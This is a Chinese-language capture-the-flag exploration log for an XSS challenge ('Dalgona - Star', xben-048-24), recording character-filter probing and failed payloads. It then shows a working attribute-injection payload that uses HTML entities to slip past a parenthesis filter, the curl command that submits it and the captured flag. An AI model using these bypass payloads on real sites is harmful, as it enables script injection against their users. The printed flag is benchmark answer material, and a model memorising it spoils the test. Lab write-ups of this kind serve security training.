# xben-048-24 · 探索记录

对应题解：[`xben-048-24.md`](./xben-048-24.md)

## 目标与起点

`Werkzeug/1.0.1 Python/2.7.18`，`GET /page?name=…`，样式 `xss20.css`，标题
`Dalgona - Star`。

反射结果：

```html
<input type=text name=name placeholder="Enter your name..." ><img src="abc">
```

即输入被放进一个 `<img src="…">` 的属性里。

## 第一阶段：逐字符探测

`Q<ch>Q` 形式提交 94 个可打印字符：

| 字符 | 反射 |
| --- | --- |
| `<` `>` `(` `)` `` ` `` | **空**（整段丢弃） |
| 其余（含 `"` `'` `&` `#` `;` `/` 空格） | `Q<ch>Q` 原样 |

## 第二阶段：常规 XSS 全部失败

| payload | 结果 |
| --- | --- |
| `<svg onload=alert("XSS")>` | 失败（`<` 被禁） |
| `<img src=x onerror=alert("XSS")>` | 失败（`(` `)` 被禁） |
| `<input autofocus onfocus=alert("XSS")>` | 失败 |
| ``alert`XSS` `` | 失败（反引号被禁） |

## 第三阶段：属性注入 + 实体编码

先闭合 `src`，再追加 `onerror`；括号用 HTML 实体：

| payload | 结果 |
| --- | --- |
| `" onerror=alert&#40;'XSS'&#41; x="` | **Congratulations** |
| `" onerror=alert&#x28;'XSS'&#x29; x="` | **Congratulations** |

渲染结果：

```html
<img src="" onerror=alert&#40;'XSS'&#41; x="">
```

浏览器解码实体后执行 `alert('XSS')`。

## 第四阶段：拿 flag

```bash
curl --get --data-urlencode 'name=" onerror=alert&#40;'"'"'XSS'"'"'&#41; x="' http://$T/page
```

```text
flag{9a079e21-9116-4363-ad6f-36cdbdf8b584}
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 造标签（`<svg>`、`<img>`） | 输入被丢 | `<` `>` 属丢弃字符 |
| 直接写 `alert("XSS")` | 输入被丢 | `(` `)` 属丢弃字符 |
| 反引号调用 | 输入被丢 | 反引号属丢弃字符 |
| 实体 `&#40;`/`&#x28;` | **成功** | `&` `#` 未被过滤，HTML 解析时解码 |

## 这次真正的收获

1. **「整段丢弃」和「字符替换」要分开判。** 这一关反射变空 = 整段丢弃；
   011/016 是替换/删除后继续渲染。两者的绕过思路完全不同。
2. **括号被禁时优先试 HTML 实体。** `&#40;` / `&#x28;` 在属性值里由 HTML 解析器
   解码后才交给 JS，所以能绕过「只检查原始输入」的过滤。
   前提：`&` 和 `#` 没被拦（本题都放行）。
3. **属性上下文不需要造标签。** `"` 闭合 → 空格 → `onerror=…`；
   这比绕过 `<`/`>` 简单得多。
4. **`src=""` 保证加载失败**，所以 `onerror` 必然触发，无需构造坏 URL。
5. **反引号在这里是被明确过滤的字符**，而同族 047 里反引号可用——
   再次说明这个靶场每关的规则都不同，必须逐关探测。
